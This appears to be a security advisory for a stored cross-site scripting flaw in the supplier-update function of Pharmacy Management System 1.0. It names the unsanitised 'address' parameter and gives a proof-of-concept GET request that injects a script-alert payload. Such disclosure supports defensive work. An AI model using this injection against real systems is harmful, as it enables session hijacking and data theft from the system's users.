| --- | --- |
| Description | A \*\*stored XSS vulnerability\*\* has been identified in the \*\*Pharmacy Management System\*\* version 1.0, specifically in the \*\*supplier management update functionality\*\*. This vulnerability occurs because the input in the `address` parameter is not properly sanitized before being saved to the database. This flaw allows attackers to inject malicious JavaScript code that will persist in the system and execute whenever the affected supplier record is accessed. |

[**xss\_persistencemanager\_edit\_supplier.md**](#file-xss_persistencemanager_edit_supplier-md)

## **Affected Version:**

* **Pharmacy Management System**: 1.0

## **Vulnerability Information:**

* **Vulnerability Type:** Stored Cross-Site Scripting (XSS)
* **Severity:** HIGH
* **Status:** Unpatched

## **Vulnerable Endpoint:**

* `/php/manage_supplier.php?action=update&id=35&name=A&email=contato@gmail.com&contact_number=0987654321&address=a`

## **Vulnerability Description:**

A **stored XSS vulnerability** has been identified in the **Pharmacy Management System** version 1.0, specifically in the **supplier management update functionality**. This vulnerability occurs because the input in the `address` parameter is not properly sanitized before being saved to the database. This flaw allows attackers to inject malicious JavaScript code that will persist in the system and execute whenever the affected supplier record is accessed.

Since this vulnerability affects both administrators and users, it poses a **high risk** by enabling:

* **Session hijacking**
* **Theft of sensitive data** (e.g., authentication tokens)
* **Privilege escalation**
* **Website defacement** and manipulation of critical records
* **Phishing attacks** to trick users or administrators into disclosing personal information

The persistent nature of the vulnerability makes it particularly dangerous, as the malicious code is executed every time the affected page is loaded.

---

## **Proof of Concept (PoC):**

Below is an example of a **GET** request that demonstrates the vulnerability by injecting a simple JavaScript payload into the `address` field:

```
GET /php/manage_supplier.php?action=update&id=35&name=A&email=contato@gmail.com&contact_number=0987654321&address=%3Cscript%3Ealert(%22XSS%22);%3C/script%3E HTTP/1.1
Host: localhost:8080
sec-ch-ua-platform: "Linux"
Accept-Language: pt-BR,pt;q=0.9
sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
sec-ch-ua-mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8080/manage_supplier.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=48068ce7875c00d88ca3aa2b9269b91f
Connection: keep-alive

```

When this payload is submitted, the malicious JavaScript code will be stored in the supplier‚Äôs address field. Every time the supplier record is viewed, the following JavaScript will execute, triggering an alert:

```
<script>alert('XSS');</script>
```

This demonstrates how the vulnerability works. A more advanced attacker could use this to steal session cookies or redirect users to malicious websites.
